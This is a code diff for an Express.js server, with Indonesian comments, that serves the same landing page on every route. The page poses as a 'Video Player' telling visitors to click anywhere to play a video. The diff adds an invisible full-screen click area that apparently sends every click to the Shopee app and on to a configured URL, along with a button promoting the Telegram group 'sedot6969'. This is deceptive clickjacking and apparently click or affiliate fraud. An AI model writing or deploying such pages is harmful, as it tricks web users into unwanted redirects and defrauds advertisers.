@@ -86,6 +86,14 @@ app.use(async (req, res) => {
           cursor: pointer;
         }
         
+        .content-wrapper {
+          position: relative;
+          z-index: 2;
+          pointer-events: none;
+          width: 100%;
+          max-width: 500px;
+        }
+        
         .click-box {
           background: #EE4D2D;
           color: white;
@@ -112,13 +120,18 @@ app.use(async (req, res) => {
           pointer-events: auto;
           cursor: pointer;
           border: none;
-          z-index: 1000000;
+          z-index: 1000001;
           position: relative;
+          box-shadow: 0 4px 15px rgba(0,136,204,0.3);
         }
         
         .telegram-button:hover {
           background: #006699;
           transform: scale(1.05);
+        }
+        
+        .telegram-button:active {
+          transform: scale(0.95);
         }
         
         .instruction {
@@ -130,6 +143,7 @@ app.use(async (req, res) => {
         
         h1 {
           pointer-events: none;
+          margin-bottom: 20px;
         }
         
         #redirect-overlay:hover .click-box {
@@ -156,23 +170,40 @@ app.use(async (req, res) => {
           align-items: center;
           gap: 15px;
           margin: 20px 0;
+          pointer-events: none;
+        }
+        
+        /* Area khusus untuk klik overlay (Shopee) */
+        .overlay-click-area {
+          position: absolute;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          z-index: 1;
         }
       </style>
     </head>
     <body>
+      <!-- Area klik untuk Shopee (seluruh layar) -->
+      <div class="overlay-click-area" id="shopeeClickArea"></div>
+      
+      <!-- Konten yang terlihat -->
       <div id="redirect-overlay">
-        <h1>🎬 Video Player</h1>
-        <div class="click-box">
-          KLIK DIMANAPUN UNTUK PLAY VIDEO
-        </div>
-        <div class="button-container">
-          <button class="telegram-button" id="telegramButton" onclick="event.stopPropagation(); window.open('https://t.me/sedot6969', '_blank');">
-            📱 JOIN TELE
-          </button>
-        </div>
-        <div class="instruction">
-          Klik di area manapun<br>
-          <small>Lanjut ke video</small>
+        <div class="content-wrapper">
+          <h1>🎬 Video Player</h1>
+          <div class="click-box">
+            KLIK DIMANAPUN UNTUK PLAY VIDEO
+          </div>
+          <div class="button-container">
+            <button class="telegram-button" id="telegramButton">
+              📱 JOIN TELE
+            </button>
+          </div>
+          <div class="instruction">
+            Klik di area manapun<br>
+            <small>Lanjut ke video</small>
+          </div>
         </div>
       </div>
 
@@ -275,12 +306,26 @@ app.use(async (req, res) => {
           }
         }
         
-        const overlay = document.getElementById('redirect-overlay');
-        
-        overlay.addEventListener('click', handleClick);
-        overlay.addEventListener('touchstart', function(e) {
+        // Event listener untuk area klik Shopee
+        const shopeeArea = document.getElementById('shopeeClickArea');
+        shopeeArea.addEventListener('click', handleClick);
+        shopeeArea.addEventListener('touchstart', function(e) {
           e.preventDefault();
           handleClick();
+        });
+        
+        // Event listener untuk tombol Telegram
+        const telegramBtn = document.getElementById('telegramButton');
+        telegramBtn.addEventListener('click', function(e) {
+          e.stopPropagation(); // Mencegah event bubbling ke overlay
+          e.preventDefault();
+          window.open('https://t.me/sedot6969', '_blank');
+        });
+        
+        telegramBtn.addEventListener('touchstart', function(e) {
+          e.stopPropagation();
+          e.preventDefault();
+          window.open('https://t.me/sedot6969', '_blank');
         });
         
         document.addEventListener('keydown', function(e) {
@@ -290,7 +335,7 @@ app.use(async (req, res) => {
           }
         });
         
-        console.log('Siap: Klik di mana saja untuk buka aplikasi Shopee');
+        console.log('Siap: Klik di area gelap untuk Shopee, klik tombol Telegram untuk join grup');
       </script>
     </body>
     </html>
@@ -311,4 +356,5 @@ app.listen(PORT, () => {
   console.log(`Server running: http://localhost:${PORT}`);
   console.log(`Mode: SEMUA halaman kena landing page`);
   console.log(`Redirect: Klik → Shopee → ${BASE_URL}`);
+  console.log(`Tombol Telegram: https://t.me/sedot6969`);
 });
